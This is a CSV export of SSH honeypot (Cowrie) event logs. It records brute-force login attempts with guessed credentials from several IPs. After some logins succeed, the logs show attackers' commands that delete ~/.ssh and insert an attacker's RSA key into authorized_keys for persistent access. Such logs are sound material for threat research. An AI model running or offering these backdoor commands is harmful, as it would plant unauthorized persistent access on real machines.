eventid,src_ip,src_port,dst_ip,dst_port,session,protocol,version,hassh,hasshAlgorithms,message,sensor,timestamp
cowrie.client.version,139.199.80.137,,,,cd0a92f36c4c,,SSH-2.0-libssh-0.2,,,Remote SSH version: SSH-2.0-libssh-0.2,localhost,2024-12-01T01:12:24.672469Z
cowrie.session.closed,139.199.80.137,,,,cd0a92f36c4c,,,,,Connection lost after 0 seconds,localhost,2024-12-01T01:12:24.836174Z
cowrie.session.connect,98.97.135.131,32884,172.233.154.19,2222,e6b9d3c31636,ssh,,,,New connection: 98.97.135.131:32884 (172.233.154.19:2222) [session: e6b9d3c31636],localhost,2024-12-01T01:12:28.622835Z
cowrie.client.version,98.97.135.131,,,,e6b9d3c31636,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:12:28.623624Z
cowrie.client.kex,98.97.135.131,,,,e6b9d3c31636,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T01:12:28.822061Z
cowrie.login.failed,98.97.135.131,,,,e6b9d3c31636,,,,,login attempt [insane/insane] failed,localhost,2024-12-01T01:12:29.634717Z
cowrie.session.closed,98.97.135.131,,,,e6b9d3c31636,,,,,Connection lost after 2 seconds,localhost,2024-12-01T01:12:30.827044Z
cowrie.session.connect,36.137.99.125,45902,172.233.154.19,2222,f74d82ddb1f6,ssh,,,,New connection: 36.137.99.125:45902 (172.233.154.19:2222) [session: f74d82ddb1f6],localhost,2024-12-01T01:12:30.911994Z
cowrie.client.version,36.137.99.125,,,,f74d82ddb1f6,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:12:30.912533Z
cowrie.client.kex,36.137.99.125,,,,f74d82ddb1f6,,,8c95e28f1643c38e5d64511b4d499e94,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-ctr,aes192-ctr,aes128-ctr;hmac-sha1;none",SSH client hassh fingerprint: 8c95e28f1643c38e5d64511b4d499e94,localhost,2024-12-01T01:12:31.107403Z
cowrie.login.success,36.137.99.125,,,,f74d82ddb1f6,,,,,login attempt [root/hh123456] succeeded,localhost,2024-12-01T01:12:31.927908Z
cowrie.session.params,36.137.99.125,,,,f74d82ddb1f6,,,,,[],localhost,2024-12-01T01:12:32.333040Z
cowrie.command.input,36.137.99.125,,,,f74d82ddb1f6,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-12-01T01:12:32.333574Z
cowrie.command.failed,36.137.99.125,,,,f74d82ddb1f6,,,,,Command not found: lockr -ia .ssh,localhost,2024-12-01T01:12:32.334222Z
cowrie.log.closed,36.137.99.125,,,,f74d82ddb1f6,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-12-01T01:12:32.765116Z
cowrie.session.params,36.137.99.125,,,,f74d82ddb1f6,,,,,[],localhost,2024-12-01T01:12:32.976918Z
cowrie.command.input,36.137.99.125,,,,f74d82ddb1f6,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-12-01T01:12:32.977269Z
cowrie.session.file_download,36.137.99.125,,,,f74d82ddb1f6,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-12-01T01:12:33.173837Z
cowrie.log.closed,36.137.99.125,,,,f74d82ddb1f6,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-12-01T01:12:33.174308Z
cowrie.session.connect,36.137.99.125,46292,172.233.154.19,2222,70d7974b54cd,ssh,,,,New connection: 36.137.99.125:46292 (172.233.154.19:2222) [session: 70d7974b54cd],localhost,2024-12-01T01:12:33.348497Z
cowrie.client.version,36.137.99.125,,,,70d7974b54cd,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:12:33.349022Z
cowrie.client.kex,36.137.99.125,,,,70d7974b54cd,,,8c95e28f1643c38e5d64511b4d499e94,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-ctr,aes192-ctr,aes128-ctr;hmac-sha1;none",SSH client hassh fingerprint: 8c95e28f1643c38e5d64511b4d499e94,localhost,2024-12-01T01:12:33.534039Z
cowrie.login.failed,36.137.99.125,,,,70d7974b54cd,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-12-01T01:12:34.314918Z
cowrie.session.closed,36.137.99.125,,,,70d7974b54cd,,,,,Connection lost after 2 seconds,localhost,2024-12-01T01:12:35.502329Z
cowrie.session.connect,36.137.99.125,46742,172.233.154.19,2222,498a4c957176,ssh,,,,New connection: 36.137.99.125:46742 (172.233.154.19:2222) [session: 498a4c957176],localhost,2024-12-01T01:12:35.703928Z
cowrie.client.version,36.137.99.125,,,,498a4c957176,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:12:35.704459Z
cowrie.client.kex,36.137.99.125,,,,498a4c957176,,,8c95e28f1643c38e5d64511b4d499e94,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-ctr,aes192-ctr,aes128-ctr;hmac-sha1;none",SSH client hassh fingerprint: 8c95e28f1643c38e5d64511b4d499e94,localhost,2024-12-01T01:12:35.899215Z
cowrie.login.success,36.137.99.125,,,,498a4c957176,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-12-01T01:12:36.720567Z
cowrie.session.closed,36.137.99.125,,,,498a4c957176,,,,,Connection lost after 1 seconds,localhost,2024-12-01T01:12:36.916733Z
cowrie.session.closed,36.137.99.125,,,,f74d82ddb1f6,,,,,Connection lost after 6 seconds,localhost,2024-12-01T01:12:36.918808Z
cowrie.session.connect,4.197.106.54,50074,172.233.154.19,2222,4c7e94972e65,ssh,,,,New connection: 4.197.106.54:50074 (172.233.154.19:2222) [session: 4c7e94972e65],localhost,2024-12-01T01:13:05.809328Z
cowrie.client.version,4.197.106.54,,,,4c7e94972e65,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:13:05.810120Z
cowrie.client.kex,4.197.106.54,,,,4c7e94972e65,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T01:13:05.952164Z
cowrie.login.failed,4.197.106.54,,,,4c7e94972e65,,,,,login attempt [emil/emil123] failed,localhost,2024-12-01T01:13:06.563444Z
cowrie.session.closed,4.197.106.54,,,,4c7e94972e65,,,,,Connection lost after 1 seconds,localhost,2024-12-01T01:13:07.707791Z
cowrie.session.connect,181.1.152.226,50042,172.233.154.19,2222,3f27f1b3e1f3,ssh,,,,New connection: 181.1.152.226:50042 (172.233.154.19:2222) [session: 3f27f1b3e1f3],localhost,2024-12-01T01:13:29.903014Z
cowrie.client.version,181.1.152.226,,,,3f27f1b3e1f3,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:13:29.903845Z
cowrie.client.kex,181.1.152.226,,,,3f27f1b3e1f3,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T01:13:30.053012Z
cowrie.login.failed,181.1.152.226,,,,3f27f1b3e1f3,,,,,login attempt [alex/qwe123] failed,localhost,2024-12-01T01:13:30.686677Z
cowrie.session.closed,181.1.152.226,,,,3f27f1b3e1f3,,,,,Connection lost after 1 seconds,localhost,2024-12-01T01:13:31.837264Z
cowrie.session.connect,98.97.135.131,37124,172.233.154.19,2222,b609688d6a2f,ssh,,,,New connection: 98.97.135.131:37124 (172.233.154.19:2222) [session: b609688d6a2f],localhost,2024-12-01T01:14:01.804338Z
cowrie.client.version,98.97.135.131,,,,b609688d6a2f,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:14:01.807804Z
cowrie.client.kex,98.97.135.131,,,,b609688d6a2f,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T01:14:02.007991Z
cowrie.login.failed,98.97.135.131,,,,b609688d6a2f,,,,,login attempt [neusoft/neusoft] failed,localhost,2024-12-01T01:14:02.803511Z
cowrie.session.closed,98.97.135.131,,,,b609688d6a2f,,,,,Connection lost after 2 seconds,localhost,2024-12-01T01:14:04.006925Z
cowrie.session.connect,14.103.127.83,54336,172.233.154.19,2222,d19f0944b596,ssh,,,,New connection: 14.103.127.83:54336 (172.233.154.19:2222) [session: d19f0944b596],localhost,2024-12-01T01:14:18.067206Z
cowrie.client.version,14.103.127.83,,,,d19f0944b596,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:14:18.067828Z
cowrie.session.connect,103.160.5.218,56894,172.233.154.19,2222,c3ec340f979f,ssh,,,,New connection: 103.160.5.218:56894 (172.233.154.19:2222) [session: c3ec340f979f],localhost,2024-12-01T01:14:21.889675Z
cowrie.client.version,103.160.5.218,,,,c3ec340f979f,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:14:21.890423Z
cowrie.client.kex,103.160.5.218,,,,c3ec340f979f,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T01:14:22.077568Z
cowrie.login.success,103.160.5.218,,,,c3ec340f979f,,,,,login attempt [root/Sugon;123] succeeded,localhost,2024-12-01T01:14:22.867641Z
cowrie.session.params,103.160.5.218,,,,c3ec340f979f,,,,,[],localhost,2024-12-01T01:14:23.256780Z
cowrie.command.input,103.160.5.218,,,,c3ec340f979f,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-12-01T01:14:23.257595Z
cowrie.command.failed,103.160.5.218,,,,c3ec340f979f,,,,,Command not found: lockr -ia .ssh,localhost,2024-12-01T01:14:23.258280Z
cowrie.log.closed,103.160.5.218,,,,c3ec340f979f,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-12-01T01:14:23.673387Z
cowrie.session.params,103.160.5.218,,,,c3ec340f979f,,,,,[],localhost,2024-12-01T01:14:23.878250Z
cowrie.command.input,103.160.5.218,,,,c3ec340f979f,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-12-01T01:14:23.878634Z
cowrie.session.file_download,103.160.5.218,,,,c3ec340f979f,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-12-01T01:14:24.067772Z
cowrie.log.closed,103.160.5.218,,,,c3ec340f979f,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-12-01T01:14:24.068300Z
cowrie.session.connect,103.160.5.218,56908,172.233.154.19,2222,c0d2a5963445,ssh,,,,New connection: 103.160.5.218:56908 (172.233.154.19:2222) [session: c0d2a5963445],localhost,2024-12-01T01:14:24.253946Z
cowrie.client.version,103.160.5.218,,,,c0d2a5963445,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:14:24.254539Z
cowrie.client.kex,103.160.5.218,,,,c0d2a5963445,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T01:14:24.441608Z
cowrie.login.failed,103.160.5.218,,,,c0d2a5963445,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-12-01T01:14:25.229800Z
cowrie.session.closed,103.160.5.218,,,,c0d2a5963445,,,,,Connection lost after 2 seconds,localhost,2024-12-01T01:14:26.419208Z
cowrie.session.connect,103.160.5.218,56916,172.233.154.19,2222,9c498a2e292b,ssh,,,,New connection: 103.160.5.218:56916 (172.233.154.19:2222) [session: 9c498a2e292b],localhost,2024-12-01T01:14:26.613568Z
cowrie.client.version,103.160.5.218,,,,9c498a2e292b,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:14:26.614160Z
cowrie.client.kex,103.160.5.218,,,,9c498a2e292b,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T01:14:26.807839Z
cowrie.login.success,103.160.5.218,,,,9c498a2e292b,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-12-01T01:14:27.623783Z
cowrie.session.closed,103.160.5.218,,,,c3ec340f979f,,,,,Connection lost after 5 seconds,localhost,2024-12-01T01:14:27.817170Z
cowrie.session.closed,103.160.5.218,,,,9c498a2e292b,,,,,Connection lost after 1 seconds,localhost,2024-12-01T01:14:27.818624Z
cowrie.session.connect,192.241.139.29,52406,172.233.154.19,2222,45c27639cf38,ssh,,,,New connection: 192.241.139.29:52406 (172.233.154.19:2222) [session: 45c27639cf38],localhost,2024-12-01T01:14:39.141071Z
cowrie.client.version,192.241.139.29,,,,45c27639cf38,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:14:39.141733Z
cowrie.client.kex,192.241.139.29,,,,45c27639cf38,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T01:14:39.207585Z
cowrie.login.success,192.241.139.29,,,,45c27639cf38,,,,,login attempt [root/root888888] succeeded,localhost,2024-12-01T01:14:39.512651Z
cowrie.session.params,192.241.139.29,,,,45c27639cf38,,,,,[],localhost,2024-12-01T01:14:39.665642Z
cowrie.command.input,192.241.139.29,,,,45c27639cf38,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-12-01T01:14:39.666051Z
cowrie.command.failed,192.241.139.29,,,,45c27639cf38,,,,,Command not found: lockr -ia .ssh,localhost,2024-12-01T01:14:39.666715Z
cowrie.log.closed,192.241.139.29,,,,45c27639cf38,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-12-01T01:14:39.842618Z
cowrie.session.params,192.241.139.29,,,,45c27639cf38,,,,,[],localhost,2024-12-01T01:14:39.927107Z
cowrie.command.input,192.241.139.29,,,,45c27639cf38,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-12-01T01:14:39.927460Z
cowrie.session.file_download,192.241.139.29,,,,45c27639cf38,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-12-01T01:14:39.995887Z
cowrie.log.closed,192.241.139.29,,,,45c27639cf38,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-12-01T01:14:39.996361Z
cowrie.session.connect,192.241.139.29,52418,172.233.154.19,2222,423fee24fccc,ssh,,,,New connection: 192.241.139.29:52418 (172.233.154.19:2222) [session: 423fee24fccc],localhost,2024-12-01T01:14:40.066596Z
cowrie.client.version,192.241.139.29,,,,423fee24fccc,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:14:40.079395Z
cowrie.client.kex,192.241.139.29,,,,423fee24fccc,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T01:14:40.144297Z
cowrie.login.failed,192.241.139.29,,,,423fee24fccc,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-12-01T01:14:40.411998Z
cowrie.session.connect,4.197.106.54,56722,172.233.154.19,2222,dd85dfc2e9b9,ssh,,,,New connection: 4.197.106.54:56722 (172.233.154.19:2222) [session: dd85dfc2e9b9],localhost,2024-12-01T01:14:41.478187Z
cowrie.client.version,4.197.106.54,,,,dd85dfc2e9b9,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:14:41.478686Z
cowrie.session.closed,192.241.139.29,,,,423fee24fccc,,,,,Connection lost after 1 seconds,localhost,2024-12-01T01:14:41.481511Z
cowrie.session.connect,192.241.139.29,46462,172.233.154.19,2222,f7222784bdb2,ssh,,,,New connection: 192.241.139.29:46462 (172.233.154.19:2222) [session: f7222784bdb2],localhost,2024-12-01T01:14:41.546656Z
cowrie.client.version,192.241.139.29,,,,f7222784bdb2,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T01:14:41.547230Z
cowrie.client.kex,192.241.139.29,,,,f7222784bdb2,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T01:14:41.618450Z
